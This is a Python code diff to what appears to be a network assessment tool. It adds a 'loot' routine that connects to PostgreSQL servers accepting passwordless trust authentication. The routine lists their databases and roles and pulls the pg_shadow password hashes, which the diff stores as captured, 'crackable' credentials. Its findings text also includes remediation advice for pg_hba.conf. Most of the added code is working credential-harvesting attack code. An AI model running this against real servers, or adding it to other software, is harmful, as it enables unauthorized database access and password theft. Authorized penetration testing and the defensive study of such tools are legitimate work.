@@ -117,6 +117,74 @@ def probe(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres")
             pass
 
 
+def _read_until_ready(sock: socket.socket) -> None:
+    """After AuthenticationOk, drain ParameterStatus/BackendKeyData up to ReadyForQuery."""
+    for _ in range(100):
+        typ, _body = _read_message(sock)
+        if typ is None or typ == b"Z":          # ReadyForQuery
+            return
+
+
+def _simple_query(sock: socket.socket, sql: str) -> list[list]:
+    """Run one simple query and return its rows (list of list of str|None). Read-only."""
+    msg = sql.encode() + b"\x00"
+    sock.sendall(b"Q" + struct.pack("!I", len(msg) + 4) + msg)
+    rows: list[list] = []
+    for _ in range(5000):
+        typ, body = _read_message(sock)
+        if typ is None or typ == b"Z":          # ReadyForQuery -> query done
+            break
+        if typ == b"D":                          # DataRow
+            n = struct.unpack("!H", body[:2])[0]
+            off, row = 2, []
+            for _c in range(n):
+                ln = struct.unpack("!i", body[off:off + 4])[0]
+                off += 4
+                if ln == -1:
+                    row.append(None)
+                else:
+                    row.append(body[off:off + ln].decode("utf-8", "replace"))
+                    off += ln
+            rows.append(row)
+    return rows
+
+
+def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres") -> dict:
+    """Trust-auth confirmed -> pull read-only loot: databases, roles, and pg_shadow
+    password hashes (the postgres superuser can read them). SELECT only, no writes."""
+    out = {"databases": [], "roles": [], "hashes": [], "current_user": user}
+    try:
+        sock = socket.create_connection((ip, port), timeout=timeout)
+        sock.settimeout(timeout)
+    except OSError:
+        return out
+    try:
+        sock.sendall(_startup(user, "postgres"))
+        typ, body = _read_message(sock)
+        if typ != b"R" or (len(body) >= 4 and struct.unpack("!I", body[:4])[0] != 0):
+            return out                           # not trust after all
+        _read_until_ready(sock)
+        out["databases"] = [r[0] for r in _simple_query(
+            sock, "SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY 1")]
+        for r in _simple_query(sock, "SELECT usename, passwd, usesuper FROM pg_shadow ORDER BY 1"):
+            name, pw, sup = (r + [None, None, None])[:3]
+            out["roles"].append({"name": name, "super": sup in ("t", "true", True)})
+            if pw:
+                out["hashes"].append({"user": name, "hash": pw})
+        try:
+            sock.sendall(b"X" + struct.pack("!I", 4))   # Terminate, politely
+        except OSError:
+            pass
+    except OSError:
+        pass
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+    return out
+
+
 def postgres_targets(hosts: list[Host]) -> list[dict]:
     out = []
     for h in hosts:
@@ -145,12 +213,26 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
             tgt = f"{h.ip}:{p.portid}"
             ver = pr.get("version") or ""
             if pr.get("unauth"):
+                lt = pr.get("loot") or {}
+                loot_txt = ""
+                if lt:
+                    dbs = lt.get("databases", [])
+                    roles = lt.get("roles", [])
+                    hashes = lt.get("hashes", [])
+                    supers = [r["name"] for r in roles if r.get("super")]
+                    loot_txt = (
+                        f"\n\nLOOTED (read-only): {len(dbs)} database(s): "
+                        + ", ".join(dbs[:10])
+                        + f"; {len(roles)} role(s)"
+                        + (f" (superuser: {', '.join(supers[:5])})" if supers else "")
+                        + (f"; {len(hashes)} password hash(es) captured (crackable) -> "
+                           + ", ".join(h["user"] for h in hashes[:8]) if hashes else ""))
                 out.append(_finding(
                     "high", "PostgreSQL trust authentication (no password required)", tgt,
                     "The server accepted a v3 startup for user 'postgres' with NO "
                     "password (AuthenticationOk / `trust` in pg_hba.conf)"
                     + (f"; server_version {ver}" if ver else "")
-                    + ". Anyone who can reach this port has full database access.",
+                    + ". Anyone who can reach this port has full database access." + loot_txt,
                     f"psql 'host={h.ip} port={p.portid} user=postgres dbname=postgres'",
                     "Replace `trust` in pg_hba.conf with scram-sha-256 (or md5); bind to "
                     "localhost / a private interface; require TLS for remote access.",
@@ -176,7 +258,9 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
     targets = postgres_targets(hosts)
     probes: dict = {}
     state: dict = {}
+    creds: list = []
     if active:
+        from .models import Credential
         for t, pr in svcprobe.iter_probe(
                 targets, lambda t: probe(t["ip"], t["port"]),
                 budget=budget, progress=progress, state=state):
@@ -185,11 +269,19 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                 t["unauth"] = pr.get("unauth", False)
                 t["auth_required"] = pr.get("auth_required", False)
                 t["version"] = pr.get("version", "") or t.get("version", "")
+                if pr.get("unauth"):
+                    pr["loot"] = loot(t["ip"], t["port"])
+                    for hh in pr["loot"].get("hashes", []):
+                        creds.append(Credential(
+                            username=hh["user"], secret=hh["hash"], kind="hash",
+                            source="postgres-loot", origin_ip=t["ip"],
+                            notes=f"pg_shadow hash from trust-auth PostgreSQL :{t['port']}"))
     fs = findings(hosts, probes)
     runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                  "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                 for t in targets]
     return {"targets": targets, "findings": fs, "runbooks": runbooks,
+            "credentials": creds,
             "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
             "stats": {"targets": len(targets), "findings": len(fs),
-                      "stopped": state.get("stopped")}}
+                      "credentials": len(creds), "stopped": state.get("stopped")}}
